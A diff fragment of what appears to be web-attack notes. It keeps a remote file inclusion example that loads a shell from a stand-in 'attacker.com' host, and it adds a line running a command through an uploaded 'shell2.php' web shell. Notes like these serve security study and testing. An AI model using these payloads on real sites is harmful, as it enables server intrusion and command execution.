@@ -105,5 +105,5 @@ Example: fileshare.com/files.php?file=http://attacker.com/shells/shell.txt
 Unrestricted File Upload
 //If file upload doesnt check against file extension uploads, can upload file such as shell2.php and browse
 to that file upload location with the cmd parameter such as:
-
+Example: fileshare.com/avatars/shell2.php?cmd=ls
 ```
